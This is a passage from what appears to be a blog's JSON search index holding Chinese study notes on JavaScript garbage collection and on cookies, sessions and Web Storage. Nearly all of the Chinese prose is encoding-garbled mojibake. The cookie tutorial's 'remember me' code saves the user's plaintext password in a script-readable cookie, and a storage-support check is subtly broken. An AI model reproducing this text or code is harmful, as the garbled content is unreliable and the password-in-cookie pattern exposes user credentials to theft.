ä¼˜ç‚¹ï¼šå®ç°ç®€å•ç¼ºç‚¹ï¼šå†…å­˜è¿‡äºç¢ç‰‡åŒ–ï¼ˆæ ‡è®°-æ•´ç†æ³•ï¼‰ï¼›åˆ†é…é€Ÿåº¦æ…¢ï¼ˆéå†ï¼‰ä¼˜åŒ–æ–¹æ¡ˆï¼š**æ ‡è®°-æ•´ç†æ³•  Mark-Compact **â€‹\tæ¸…é™¤æ—¶å¯¹å †å†…å­˜éå†æ—¶ï¼Œå…ˆå°†è¢«å¼•ç”¨çš„å¯¹è±¡ç§»åŠ¨åˆ°ä¸€èµ·ï¼Œç„¶åå†æ¸…ç†#### 2. å¼•ç”¨è®¡æ•°æ³• Reference countingâ€‹\tè¿½è¸ªæ¯ä¸ªå˜é‡è¢«å¼•ç”¨çš„æ¬¡æ•°ï¼Œå½“å¼•ç”¨ä¸º0æ—¶å›æ”¶ï¼›ï¼ˆå›æ”¶æ•ˆç‡é«˜ï¼‰ï¼š  èµ‹å€¼ç»™å¼•ç”¨å€¼æ—¶ï¼Œå¼•ç”¨æ•° +1ï¼›  ä¿å­˜å¼•ç”¨çš„å˜é‡è¢«è¦†ç›–äº†ï¼Œå¼•ç”¨æ•° -1ç¼ºç‚¹ï¼ša è®¡æ•°å™¨çš„å¢å‡å¤„ç†é¢‘ç¹ï¼Œä¼šå¯¼è‡´ç©ºé—´çš„ä½¿ç”¨æ•ˆç‡é™ä½ã€‚â€ƒâ€ƒâ€ƒb å¾ªç¯å¼•ç”¨æ— æ³•æ”¶å›ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼ã€‚3. å¾ªç¯å¼•ç”¨åœ¨IE9ä¹‹å‰ï¼Œæ¶‰åŠåˆ°COMå¯¹è±¡ï¼ˆç»„ä»¶å¯¹è±¡æ¨¡å‹ï¼ŒComponent Object Modelï¼‰ï¼Œå°±æ— æ³•é¿å… å¾ªç¯å¼•ç”¨ çš„é—®é¢˜ï¼š  BOM å’Œ DOM ä¸­å¯¹è±¡æ˜¯C++å®ç°çš„COMå¯¹è±¡ï¼Œä½¿ç”¨ å¼•ç”¨è®¡æ•° å®ç°åƒåœ¾å›æ”¶ã€‚å³ä½¿å¼•æ“ä½¿ç”¨ æ ‡å¿—æ¸…ç†ï¼Œè®¾è®¡åˆ°COMå¯¹è±¡ä¾ç„¶å¯èƒ½å½¢æˆå¾ªç¯å¼•ç”¨ï¼Œå³ä½¿åœ¨é¡µé¢ä¸­åˆ é™¤DOMå…ƒç´ å†…å­˜ä¹Ÿä¸€æ ·ã€‚   let element = document.getElementById('one'); // comå¯¹è±¡   let obj = new Object() // åŸç”Ÿobjå¯¹è±¡   obj.element = element;   element.obj = obj;      // é¿å…ï¼šç¡®ä¿ä¸¤è€…æ²¡æœ‰è”ç³»   obj.element = null;   element.obj = null;åœ¨IE9ä¹‹åï¼ŒBOM å’Œ DOM å¯¹è±¡éƒ½å˜æˆäº†JavaScriptå¯¹è±¡ï¼Œé¿å…äº†å¾ªç¯å¼•ç”¨é—®é¢˜ï¼ŒåŠå¸¸è§çš„å†…å­˜æ³„éœ²é—®é¢˜ã€‚åˆ†ä»£å¼åƒåœ¾å›æ”¶æœºåˆ¶  æ–°ç”Ÿä»£ï¼šå¯¹è±¡å­˜æ´»æ—¶é—´çŸ­ï¼Œé€šå¸¸æ”¯æŒ 1~8M  è€ç”Ÿä»£ï¼šå¯¹è±¡å­˜å‚¨ å­˜æ´»æ—¶é—´é•¿ã€å¸¸é©»å†…å­˜çš„å¯¹è±¡ä¸¤ä¸ªå†…å­˜åŒºåŸŸå›æ”¶é¢‘ç‡ä¸åŒï¼ŒV8æ‰æœ‰ä¸¤ä¸ªåƒåœ¾å›æ”¶å™¨ç®¡æ§ï¼šæ–°ç”Ÿä»£åƒåœ¾å›æ”¶â€‹\tCheneyç®—æ³•ï¼Œå°†å †å†…å­˜åˆ†ä¸ºä¸¤ä¸ªåŒºï¼ˆsemispace åŠç©ºé—´ï¼‰ï¼šä¸€ä¸ªä½¿ç”¨çŠ¶æ€çš„ç©ºé—´æˆ‘ä»¬ç§°ä¸ºä½¿ç”¨åŒºï¼ˆFrom ç©ºé—´ï¼‰ã€‚ä¸€ä¸ªå¤„äºé—²ç½®çŠ¶æ€çš„ç©ºé—´ç§°ä¸ºç©ºé—²åŒºï¼ˆTo ç©ºé—´ï¼‰åƒåœ¾å›æ”¶æœºåˆ¶â€”â€”ç¿»è½¬ ï¼ˆScavengeï¼‰  å…ˆå¯¹ä½¿ç”¨åŒºä¸­çš„æ´»åŠ¨åšæ ‡è®°  æ ‡è®°å®Œæˆåï¼Œå°†ä½¿ç”¨åŒºçš„æ´»åŠ¨å¯¹è±¡å¤åˆ¶è¿›ç©ºé—²åŒºå¹¶è¿›è¡Œæ’åº  å°†åŸå…ˆä½¿ç”¨åŒºå¯¹è±¡å ç”¨çš„ç©ºé—´é‡Šæ”¾  æœ€åè¿›è¡Œè§’è‰²äº’æ¢ï¼ŒæŠŠç©ºé—²åŒºå˜ä¸ºä½¿ç”¨åŒºï¼Œä½¿ç”¨åŒºå˜ä¸ºç©ºé—²åŒºç¼ºç‚¹ï¼šç”±äºåªèƒ½ä½¿ç”¨å †å†…å­˜çš„ä¸€åŠï¼Œæ‰€ä»¥ä¸é€‚ç”¨å¤§è§„æ¨¡çš„åƒåœ¾å›æ”¶æœºåˆ¶ä¸­ï¼Œæ˜¯å…¸å‹çš„ç‰ºç‰²ç©ºé—´æ¢æ—¶é—´çš„ç®—æ³•ã€‚ â€”â€” æ–°ç”Ÿä»£å†…å­˜ç©ºé—´è¾ƒå°ã€ç”Ÿå‘½å‘¨æœŸçŸ­ï¼ˆæ´»å¯¹è±¡å°‘ï¼‰å¹¶è¡Œå›æ”¶Javascriptæ˜¯ä¸€é—¨å•çº¿ç¨‹è¯­è¨€ï¼Œå®ƒæ˜¯è¿è¡Œåœ¨ä¸»çº¿ç¨‹ä¸Šçš„ï¼Œè€Œåœ¨è¿›è¡Œåƒåœ¾å›æ”¶çš„æ—¶å€™å°±ä¼šé˜»å¡Javascriptè„šæœ¬çš„æ‰§è¡Œï¼Œéœ€ç­‰å¾…åƒåœ¾å›æ”¶å®Œæ¯•åå†æ¢å¤è„šæœ¬æ‰§è¡Œï¼Œè¿™ç§è¡Œä¸ºå«å…¨åœé¡¿ã€‚é‚£å½“GCæ—¶é—´è¿‡é•¿å°±ä¼šé€ æˆé¡µé¢å¡é¡¿é—®é¢˜ã€‚é‚£ä¸€ä¸ªäººå¹²æ´»æ…¢ï¼Œnä¸ªäººä¸€èµ·é€Ÿåº¦ä¾¿ä¼šæ˜¯ä¸€ä¸ªäººçš„nå€ã€‚ç¨‹åºä¹Ÿä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¹¶è¡Œå›æ”¶æœºåˆ¶ï¼šå¼•å…¥å¤šä¸ªè¾…åŠ©çº¿ç¨‹æ¥åŒæ—¶å¤„ç†   æ–°ç”Ÿä»£å¯¹è±¡ç©ºé—´å°±é‡‡ç”¨å¹¶è¡Œç­–ç•¥ã€‚åœ¨åƒåœ¾å›æ”¶è¿‡ç¨‹ä¸­ï¼Œå¯åŠ¨å¤šä¸ªçº¿ç¨‹æ¥è´Ÿè´£æ–°ç”Ÿä»£ä¸­çš„åƒåœ¾æ¸…ç†ï¼Œè¿™äº›çº¿ç¨‹åŒæ—¶å°†å¯¹è±¡ç©ºé—´ä¸­çš„æ•°æ®ç§»åˆ°ç©º22ç”±äºè¿™ä¸ªè¿‡ç¨‹ä¸­æ•°æ®åœ°å€ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥è¿˜éœ€è¦åŒæ­¥æ›´æ–°å¼•ç”¨è¿™äº›å¯¹è±¡çš„æŒ‡é’ˆã€‚æ–°ç”Ÿä»£ä½•æ—¶ä¼šåˆ°è€ç”Ÿä»£  å¤šæ¬¡å¤åˆ¶åä¾ç„¶å­˜æ´»çš„å¯¹è±¡ï¼Œå¯ä»¥è®¤ä¸ºæ˜¯ç”Ÿå‘½å‘¨æœŸæ•™å¼ºçš„å¯¹è±¡ï¼Œç§»åˆ°è€ç”Ÿä»£ç®¡ç†  å¤åˆ¶ä¸€ä¸ªå¯¹è±¡åœ¨ç©ºé—²åŒºæ—¶ï¼Œå ç”¨ç©ºé—²åŒºç©ºé—´çš„25%ï¼Œåˆ™ç§»åˆ°è€ç”Ÿä»£ç®¡ç† â€”â€” å½“å®ŒæˆScavengeå›æ”¶ï¼Œç©ºé—´åŒºå˜ä¸ºä½¿ç”¨åŒºï¼Œä¼šç»§ç»­å‚ä¸å†…å­˜åˆ†é…ï¼Œæ¯”é‡è¿‡å¤§å½±å“åç»­å†…å­˜åˆ†é…è€ç”Ÿä»£åƒåœ¾å›æ”¶â€‹\tè€ç”Ÿä»£æ•°æ®å¤§å¤šæ˜¯å­˜æ´»çš„å¯¹è±¡ï¼Œä¸éœ€è¦æ—¶å¸¸æ›´æ–°ï¼Œå¯ä»¥ä½¿ç”¨ æ ‡è®°æ¸…æ”¶æ³• å›æ”¶ã€‚åœ¨V8ä¸­ä½¿ç”¨ æ ‡è®°æ•´ç†æ³• è§£å†³æ ‡è®°æ¸…é™¤åäº§ç”Ÿçš„å¤§é‡å†…å­˜ç¢ç‰‡ã€‚å¢é‡æ ‡è®° ï¼ˆincremental markingï¼‰â€‹\tä»£æ›¿ å¹¶è¡Œç­–ç•¥çš„å…¨åœé¡¿å¼ çš„åƒåœ¾å›æ”¶ï¼ŒèŠ‚çœæ¸…é™¤è¾ƒå¤§å¯¹è±¡çš„è€ç”Ÿä»£çš„æ—¶é—´é—®é¢˜  ä¸€æ¬¡GCåˆ†æˆå¤šæ­¥å°GCæ ‡è®°ï¼Œè®©JSå’Œå°GCæ ‡è®°äº¤æ›¿æ‰§è¡Œï¼Œç›´åˆ°æ ‡è®°å®Œæˆã€‚  åº”ç”¨é€»è¾‘æ‰§è¡Œä¸€ä¼šï¼Œåƒåœ¾å›æ”¶ä¸åº”ç”¨é€»è¾‘äº¤æ›¿æ‰§è¡Œç›´åˆ°æ ‡è®°é˜¶æ®µå®Œæˆ  å­˜åœ¨é—®é¢˜ï¼š  â€‹\tå°GCæ ‡è®°æ‰§è¡Œå®Œåæ˜¯å¦‚ä½•æš‚åœæ‰§è¡ŒJSä»»åŠ¡ï¼Ÿâ€”â€” ä¸‰è‰²æ ‡è®°æ³•  â€‹\tå¦‚ä½•è¿›è¡Œä¸‹ä¸€æ¬¡å°GC æ ‡è®°ï¼Ÿâ€”â€” æƒ°æ€§æ¸…ç†  â€‹\tå¦‚æœæ‰§è¡ŒJSä»»åŠ¡æ—¶åˆšè¢«æ ‡è®°å¥½çš„å¯¹è±¡å¼•ç”¨åˆè¢«ä¿®æ”¹äº†è¯¥å½“å¦‚ä½•ï¼Ÿ â€”â€” å†™å±éšœä¸‰è‰²æ ‡è®°æ³•  é»‘è‰²è¡¨ç¤ºå¯¹è±¡è‡ªèº«åŠå¯¹è±¡çš„å¼•ç”¨éƒ½è¢«æ ‡è®°ï¼ˆå·²æ£€æŸ¥çŠ¶æ€ï¼‰  ç™½è‰²è¡¨ç¤ºæœªè¢«æ ‡è®°çš„å¯¹è±¡ï¼ˆåˆå§‹çŠ¶æ€ï¼‰  ç°è‰²è¡¨ç¤ºè‡ªèº«è¢«æ ‡è®°ï¼Œè‡ªèº«çš„å¼•ç”¨æœªè¢«æ ‡è®°ï¼ˆå¾…æ£€æŸ¥çŠ¶æ€ï¼‰æ‰§è¡Œæµç¨‹ï¼š  åˆå§‹æ‰€æœ‰å¯¹è±¡éƒ½æ˜¯ç™½è‰²  ä»rootå¯¹è±¡å¼€å§‹ã€æ ‡è®°ä¸ºç°è‰²ï¼Œå¹¶æ¨å…¥æ ‡è®°å·¥ä½œè¡¨ä¸­ï¼›  å½“æ”¶é›†å™¨ä»æ ‡è®°å·¥ä½œè¡¨ä¸­å¼¹å‡ºå¯¹è±¡ï¼Œå¹¶è®¿é—®å®ƒæ‰€æœ‰å¼•ç”¨å¯¹è±¡æ—¶ï¼Œè‡ªèº«ç°è‰²å°±ä¼šå˜æ¢æˆé»‘è‰²  å°†è‡ªèº«çš„ä¸‹ä¸€ä¸ªå¼•ç”¨å¯¹è±¡æ ‡å¿—ä¸ºç°è‰²ä¸€ç›´æ‰§è¡Œï¼Œç›´åˆ°æ²¡æœ‰å¯ä»¥è¢«æ ‡è®°ä¸ºç°è‰²çš„å¯¹è±¡ï¼Œå‰©ä¸‹çš„ç™½è‰²å¯¹è±¡éƒ½æ˜¯ä¸å¯è¾¾çš„ï¼Œè¿›å…¥æ¸…é™¤é˜¶æ®µï¼›æ¢å¤æ—¶ï¼Œä»ç°è‰²æ ‡è®°å¯¹è±¡å¼€å§‹æ‰§è¡Œå†™å±éšœç›®çš„ï¼š  è§£å†³é»‘è‰²å¯¹è±¡åœ¨ç¨‹åºæ‰§è¡Œä¸­è¢«æ–°æ·»åŠ å¼•ç”¨  å·²ç»æ ‡è®°é»‘è‰²çš„è¢«å¼•ç”¨å¯¹è±¡ä¸å†è¢«å¼•ç”¨äº†å†™å±éšœå°±æœ‰äº†ä»¥ä¸‹ä¸¤ä¸ªå˜åŒ–ï¼šâ€‹\t1. ä¸å¯¹å·²æ ‡è®°çš„é»‘è‰²å¯¹è±¡åšå¤„ç†ï¼Œå› ä¸ºåœ¨ä¹‹åçš„GCä¸­ä¹Ÿä¼šè¢«æ¸…ç†ã€‚  Write-barrier æœºåˆ¶å¼ºåˆ¶ä¸å˜é»‘çš„å¯¹è±¡æŒ‡å‘ç™½è‰²å¯¹è±¡ã€‚          è¿™ä¸ªä¹Ÿè¢«ç§°ä½œå¼ºä¸‰è‰²ä¸å˜æ€§ã€‚æ‰€ä»¥      ä¸€æ—¦æœ‰é»‘è‰²å¯¹è±¡å¼•ç”¨ç™½è‰²å¯¹è±¡ï¼Œè¯¥æœºåˆ¶ä¼šå¼ºåˆ¶å°†å¼•ç”¨çš„ç™½è‰²å¯¹è±¡æ”¹ä¸ºç°è‰²      ä»è€Œä¿è¯ä¸‹ä¸€æ¬¡å¢é‡ GC æ ‡è®°é˜¶æ®µå¯ä»¥æ­£ç¡®æ ‡è®°      æƒ°æ€§æ¸…ç† ï¼ˆlazy sweepingï¼‰â€‹\tå¢é‡æ ‡è®°å®Œåï¼Œå¦‚æœå½“å‰å†…å­˜è¶³ä»¥æ”¯æŒä»£ç çš„å¿«é€Ÿè¿è¡Œï¼Œä¹Ÿæ²¡å¿…è¦ç«‹å³æ¸…ç†ï¼Œå¯è®©ç¨‹åºå…ˆè¿è¡Œï¼Œä¹Ÿæ— éœ€ä¸€æ¬¡æ€§æ¸…ç†å®Œæ‰€æœ‰åƒåœ¾å¯¹è±¡ï¼Œå¯ä»¥æŒ‰éœ€æ¸…ç†ç›´åˆ°æ‰€æœ‰åƒåœ¾å¯¹è±¡æ¸…ç†å®Œåå†ç»§ç»­å¢é‡æ ‡è®°ã€‚ä¼˜åŒ–å›æ”¶V8 script éšè—ç±»JS æ€§èƒ½ä¼˜åŒ– â€”â€“ V8 éšè—ç±»â€‹\tâ€œä¸€æ¬¡æ€§å£°æ˜â€ï¼šé¿å…ç”Ÿæˆä¸åŒçš„éšè—ç±»ï¼Œâ€œå…ˆåˆ›å»ºå†è¡¥å……â€å¼åŠ¨æ€å±æ€§èµ‹å€¼ï¼Œå¹¶åœ¨æ„é€ å‡½æ•°ä¸­ä¸€æ¬¡æ€§å£°æ˜æ‰€æœ‰å±æ€§â€‹\tâ€œç½®ç©ºä¸åˆ é™¤â€ï¼šåŠ¨æ€åˆ é™¤å±æ€§å’Œæ–°å¢å±æ€§ä¸€æ ·ï¼Œä½¿å¾—åŒä¸€ä¸ªæ„é€ å‡½æ•°å‡ºæ¥çš„å®ä¾‹ä¸å†å…±äº«éšè—ç±»ã€‚æœ€ä½³æ–¹æ¡ˆæ˜¯ = nullä¼˜åŒ–ç¨‹åºå›æ”¶ï¼Œæé«˜æ€§èƒ½  æ‰‹åŠ¨å›æ”¶ï¼ˆä¸å»ºè®®ï¼‰ï¼šwindow.ColloectGarbage()ï¼ˆIEï¼‰ã€window.opera.collect()ï¼ˆopera7ä»¥ä¸Šï¼‰ç«‹å³å¯åŠ¨åƒåœ¾å›æ”¶ï¼›  è§£é™¤å¼•ç”¨ï¼šå°†ä¸éœ€è¦çš„æ•°æ®è®¾ç½®ä¸ºnullï¼Œé‡Šæ”¾å…¶å¼•ç”¨ï¼Œåœ¨ä¸‹æ¬¡å›æ”¶æ—¶é‡Šæ”¾å†…å­˜ã€‚  ä½¿ç”¨ å—çº§ä½œç”¨åŸŸ ï¼Œå°½æ—©è®©åƒåœ¾å›æ”¶ç¨‹åºä»‹å…¥ã€‚"
  },
  
  {
    "title": "8. ç½‘ç»œè¯·æ±‚é‰´æƒ",
    "url": "/posts/8.%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E9%89%B4%E6%9D%83/",
    "categories": "è®¡ç®—æœºç½‘ç»œ, cookie, session, Storage, JWt",
    "tags": "computerNetwork",
    "date": "2022-06-27 00:00:00 +0800",
    





    
    "snippet": "å­˜å‚¨â€‹\tå› ä¸º HTTPæ˜¯é¢å‘æ–‡æœ¬çš„ï¼Œæ— è¿æ¥ã€æ— çŠ¶æ€çš„åè®®ï¼Œæ‰€ä»¥éœ€è¦ æ¯æ¬¡è¯·æ±‚å¤´éƒ¨å¸¦ä¸Šcookieï¼Œä½¿æœåŠ¡å™¨å¯ä»¥ç»™ä¸åŒç”¨æˆ·åŒ¹é…ä¸åŒçš„å†…å®¹HTTP cookie      åŸºæœ¬æ¦‚å¿µ:          ç”±æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼Œå‘é€ç»™å®¢æˆ·ç«¯æµè§ˆå™¨      æµè§ˆå™¨å°†è¿™äº›æ•°æ®ä¿å­˜è‡³å®¢æˆ·ç«¯çš„æŒ‡å®šç›®å½•ä¸‹çš„æ–‡æœ¬æ–‡ä»¶ä¸­                  è¿™æ ·åœ¨ä¸‹ä¸€æ¬¡è®¿é—®ç›¸åŒçš„ç½‘ç«™æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨è¯¥cookieæ•°æ®ã€‚ ...",
    "content": "å­˜å‚¨â€‹\tå› ä¸º HTTPæ˜¯é¢å‘æ–‡æœ¬çš„ï¼Œæ— è¿æ¥ã€æ— çŠ¶æ€çš„åè®®ï¼Œæ‰€ä»¥éœ€è¦ æ¯æ¬¡è¯·æ±‚å¤´éƒ¨å¸¦ä¸Šcookieï¼Œä½¿æœåŠ¡å™¨å¯ä»¥ç»™ä¸åŒç”¨æˆ·åŒ¹é…ä¸åŒçš„å†…å®¹HTTP cookie      åŸºæœ¬æ¦‚å¿µ:          ç”±æœåŠ¡å™¨ç«¯ç”Ÿæˆï¼Œå‘é€ç»™å®¢æˆ·ç«¯æµè§ˆå™¨      æµè§ˆå™¨å°†è¿™äº›æ•°æ®ä¿å­˜è‡³å®¢æˆ·ç«¯çš„æŒ‡å®šç›®å½•ä¸‹çš„æ–‡æœ¬æ–‡ä»¶ä¸­                  è¿™æ ·åœ¨ä¸‹ä¸€æ¬¡è®¿é—®ç›¸åŒçš„ç½‘ç«™æ—¶å¯ä»¥ç›´æ¥ä½¿ç”¨è¯¥cookieæ•°æ®ã€‚          æµè§ˆå™¨å¯ä»¥æŸ¥è¯¢åˆ°cookieå€¼ï¼Œä¸å®‰å…¨                    â€œé”®-å€¼â€å¯¹(key-value pairs) çš„å½¢å¼ä¿å­˜çš„ key å’Œ value éƒ½å¯ä»¥è‡ªå®šä¹‰      å¸¸è§ç”¨äºåˆ¤æ–­ç”¨æˆ·æ˜¯å¦å·²ç™»é™†ç½‘ç«™ï¼Œæˆ–è€…ä¿å­˜è´­ç‰©è½¦ä¸­ç­‰å¾…ä»˜æ¬¾çš„å•†å“ä¿¡æ¯ç­‰ã€‚            ç”¨äºå¤„ç†å•ä¸ªäº‹åŠ¡ï¼Œå› ä¸ºå­˜åœ¨ä»¥ä¸‹é—®é¢˜:          cookieçš„å­˜å‚¨æ•°æ®é‡å°(4kb/ä¸ª,åªèƒ½ä¿å­˜50ä¸ª)      cookieè¯·æ±‚é™åˆ¶ï¼šæ¯æ¬¡æµè§ˆå™¨ä¸æœåŠ¡å™¨è¿›è¡Œè¯·æ±‚æ—¶ï¼Œcookieå¿…é¡»å­˜æ”¾åœ¨è¯·æ±‚å¤´éƒ¨ä¼ è¾“åˆ°æœåŠ¡å™¨ç«¯ã€‚            ä½¿ç”¨åœºæ™¯      cookieç¼–ç  &lt;form action=\"\"&gt;     &lt;label for=\"\"&gt;ç”¨æˆ·å&lt;/label&gt; &lt;input type=\"username\"&gt; &lt;br&gt;     &lt;label for=\"\"&gt;å¯†ç &lt;/label&gt; &lt;input type=\"password\"&gt; &lt;br&gt;     &lt;input type=\"checkbox\" id=\"remeberMe\"&gt; &lt;label for=\"remeberMe\"&gt;è®°ä½æˆ‘&lt;/label&gt; &lt;br&gt;     &lt;input type=\"submit\" value=\"ç™»å½•\"&gt;&lt;/form&gt;&lt;script&gt;    const username = document.querySelector('input[type=\"username\"]');    const password = document.querySelector('input[type=\"password\"]');    const checkbox = document.querySelector('input[type=\"checkbox\"]');    const submit = document.querySelector('input[type=\"submit\"]');    // cookieä¹‹é—´ç”¨ ; åˆ†å‰²ï¼Œcookieå†…éƒ¨ç”¨ = åˆ†å‰²    let array = document.cookie.split(';').map(cookie =&gt; cookie.split('='));    let cookie = {};    for (let i = 0; i &lt; array.length; i++) {        let name = array[i][0];  // ç¬¬ä¸€ä¸ªå€¼ä¸º é”®        let value = array[i][1]; // ç¬¬äºŒä¸ªå€¼ä¸º å€¼        cookie[name] = decodeURIComponent(value); // è¾“å…¥æ¡†çš„å€¼ç»è¿‡ç¼–ç ï¼Œè¿™é‡Œéœ€è¦è§£ç     }    // è‹¥cookieå†…éƒ¨å­˜æœ‰å€¼ï¼ŒåŠ è½½é¡µé¢å®Œæˆåè‡ªåŠ¨åŠ è½½è¿›å»    if (document.cookie) {        username.value = cookie.yourname;        password.value = cookie.youpsw;        checkbox.checked = true;    }    // æäº¤æŒ‰é’®æ·»åŠ ç›‘å¬å™¨    submit.addEventListener('click', e =&gt; {        if (checkbox.checked &amp;&amp; username.value != '') {            let key = 'yourname';            let value = encodeURIComponent(username.value); // ç”¨æˆ·è¾“å…¥ä¸å¯æ§ï¼Œå¯èƒ½å‡ºç°ä¹±ç ï¼Œéœ€è¦ç¼–ç             let passTime = 2 * 24 * 60 * 60; // è®¾ç½®ä¿è´¨æœŸæ—¶é—´ï¼Œå•ä½æ˜¯ s            document.cookie = `${key}=${value}; max-age=${passTime}`;        }        if(checkbox.checked &amp;&amp; password.value != '') {            let key = 'youpsw';            let value = encodeURIComponent(password.value);            let passTime = 2 * 24 * 60 * 60;            document.cookie = `${key}=${value}; max-age=${passTime}`;        }        e.preventDefault(); //å–æ¶ˆä¸€ä¸ªç›®æ ‡å…ƒç´ çš„é»˜è®¤è¡Œä¸º    });&lt;/script&gt;åŸºäºcookieçš„Sessionâ€‹\tsessionIDç”Ÿæˆã€ä¿å­˜åœ¨æœåŠ¡å™¨ä¸­ï¼Œç”±æœåŠ¡å™¨ä¸»å¯¼ï¼›ä½¿ç”¨cookieä½œä¸ºæ•°æ®è½½ä½“å­˜æ”¾åœ¨æµè§ˆå™¨ä¸­ä¼˜ç‚¹ï¼šğŸ‘ ä¼ é€’çš„sessionå€¼ï¼Œå¹¶ä¸åŒ…å«æ•æ„Ÿä¿¡æ¯ï¼ˆæ•æ„Ÿä¿¡æ¯å­˜æ”¾åˆ°æœåŠ¡å™¨ä¸­ï¼‰ï¼Œç›¸å¯¹å®‰å…¨ï¼Œä¸”å€¼è¾ƒå°ğŸ‘ sessionID å†…éƒ¨æœ‰æŒ‡å®šçš„ç­¾åï¼Œéæ³•ä¿®æ”¹è¿‡åæœåŠ¡å™¨å°†æ— æ³•è¯†åˆ«è€Œä¸æä¾›æœåŠ¡ğŸ‘ æµè§ˆå™¨é€€å‡ºç™»å½•åï¼ŒæœåŠ¡å™¨å†…çš„sessionå°†ä¼šè¢«åˆ é™¤ï¼›å†æ‹¿ç€è¿™ä¸ªsessionIdè¯·æ±‚ä¼šè¯å°†æ— æ•ˆç¼ºç‚¹ï¼šğŸ‘ å…¥ä¾µè€…æ‹¿åˆ°SessionIDåï¼Œå¯ä»¥åˆæ³•æ—¶é—´å†…ï¼Œä¼ªè£…å®¿ä¸»çš„ç™»å½•çŠ¶æ€å‘é€è¯·æ±‚ğŸ‘ ç‰¹ç‚¹æ—¶é—´å¤§é‡ç”¨æˆ·è®¿é—®æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¯èƒ½è¦é¢å¯¹å­˜å‚¨å¤§é‡SessionIDçš„å‹åŠ›ï¼›ğŸ‘ å¤šå°æœåŠ¡å™¨éœ€è¦åˆ†é…ç”¨æˆ·æ—¶ï¼Œæ¯å°æœåŠ¡å™¨éƒ½éœ€è¦é€šç”¨çš„SessionIDï¼Œæ‰èƒ½é¿å…ç”¨æˆ·å¤šæ¬¡è¾“å…¥æ•°æ®ç™»å½•ï¼Œå ç”¨ç©ºé—´ï¼›ä½¿ç”¨æ•°æ®åº“ï¼Œè‹¥æ•°æ®åº“å‡ºç°é—®é¢˜ï¼Œä¼šå½±å“æœåŠ¡å™¨è·å–SessionIDâ€”â€” è§£å†³åŠæ³•ï¼šä½¿ç”¨ JWTWebå­˜å‚¨  â€œé”®-å€¼â€å¯¹(key-value pairs)çš„å½¢å¼å­˜å‚¨åœ¨Webå®¢æˆ·ç«¯(ä¸å¸¸ä¸æœåŠ¡å™¨é€šä¿¡)  Webå­˜å‚¨æ›´é€‚ç”¨äºå­˜å‚¨å¤§é‡æ•°æ®(5~10M)ï¼Œ  å‘ç”Ÿè¯·æ±‚æ—¶ä¸ä¼šå¸¦ä¸ŠWebå­˜å‚¨çš„å†…å®¹ã€‚æµè§ˆå™¨æ”¯æŒçš„æƒ…å†µ&lt;script&gt;\tif(window.localStorage[window.sessionStorage]){\t//æµè§ˆå™¨æ”¯æŒWebå­˜å‚¨ä¸­çš„localStorage/sessionStorage    // å€¼ä¸ä¸ºç©º\t}else{\t//æµè§ˆå™¨ä¸æ”¯æŒWebå­˜å‚¨ä¸­çš„localStorage/sessionStorage\t}&lt;/script&gt;Storageæ¥å£â€‹\tStorageæ¥å£å®ç°æ•°æ®çš„æ·»åŠ ã€ä¿®æ”¹ã€æŸ¥è¯¢æˆ–åˆ é™¤ã€‚  StorageName.lengthï¼šè¯¥åªè¯»å±æ€§è¿”å›å€¼ä¸ºæ•´æ•°å½¢å¼ï¼Œè¡¨ç¤ºå½“å‰å­˜å‚¨å¯¹è±¡ä¸­â€œé”®-å€¼â€å¯¹çš„æ€»æ•°é‡  key(n)ï¼šç”¨äºè¿”å›æ•°æ®ä¸­ç¬¬nä¸ªå€¼çš„åç§°ã€‚å¦‚æœnå¤§äºæ‰€æœ‰é”®å€¼å¯¹çš„æ€»æ•°ï¼Œåˆ™è¿”å›nullå€¼ã€‚  getItem(key)ï¼šç”¨äºè¿”å›æŒ‡å®šé”®åç§°çš„å€¼ï¼Œå¦‚æœè¯¥åç§°ä¸å­˜åœ¨ï¼Œåˆ™è¿”å›nullå€¼ã€‚  setItem(keyï¼Œvalue)ï¼šç”¨äºè®¾ç½®ä¸€æ¡è‡ªå®šä¹‰çš„â€é”®å€¼â€å¯¹æ•°æ®ï¼Œå¦‚æœè¯¥æ•°æ®åŸå…ˆä¸å­˜åœ¨ï¼Œåˆ™ä¼šåœ¨å­˜å‚¨å¯¹è±¡çš„é”®å€¼å¯¹åˆ—è¡¨ä¸­æ–°å¢è¯¥æ•°æ®ï¼›å¦‚æœè¯¥æ•°æ®çš„é”®åç§°åŸå…ˆå­˜åœ¨ï¼Œåˆ™çœ‹æ•°æ®å€¼æ˜¯å¦æœ‰å˜åŒ–ï¼Œå¦‚æœ‰å˜åŒ–åˆ™æ›´æ–°æˆæœ€æ–°å€¼ï¼Œå¦åˆ™ä¸åšä»»ä½•æ“ä½œã€‚  removeItem(key)ï¼šç”¨äºåˆ é™¤å­˜å‚¨å¯¹è±¡ä¸­æŒ‡å®škeyåç§°çš„æ•°æ®ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸åšä»»ä½•æ“ä½œã€‚  clear()ï¼šç”¨äºæ¸…ç©ºå­˜å‚¨å¯¹è±¡ä¸­çš„é”®å€¼å¯¹åˆ—è¡¨ï¼Œå¦‚æœåŸå…ˆå°±æ— ä»»ä½•æ•°æ®åˆ™ä¸åšä»»ä½•æ“ä½œã€‚localStorage å’Œ sessionStorageå…±åŒç‚¹  ä¼˜åŠ¿          Storageæ‹“å±•äº†cookieçš„4Ké™åˆ¶      å°†ç¬¬ä¸€æ¬¡è¯·æ±‚çš„æ•°æ®ç›´æ¥å­˜å‚¨åˆ°æœ¬åœ°        å±€é™          æµè§ˆå™¨çš„å¤§å°ä¸ç»Ÿä¸€ï¼Œå¹¶ä¸”åœ¨IE8ä»¥ä¸Šçš„IEç‰ˆæœ¬æ‰æ”¯æŒ      å€¼ç±»å‹é™å®šä¸ºstringç±»å‹ï¼Œåœ¨JSONå¯¹è±¡ç±»å‹éœ€è¦ä¸€äº›è½¬æ¢      æµè§ˆå™¨çš„éšç§æ¨¡å¼ä¸‹é¢æ˜¯ä¸å¯è¯»å–çš„      æœ¬è´¨ä¸Šæ˜¯å¯¹å­—ç¬¦ä¸²çš„è¯»å–ï¼ŒåŒæ­¥åŠ 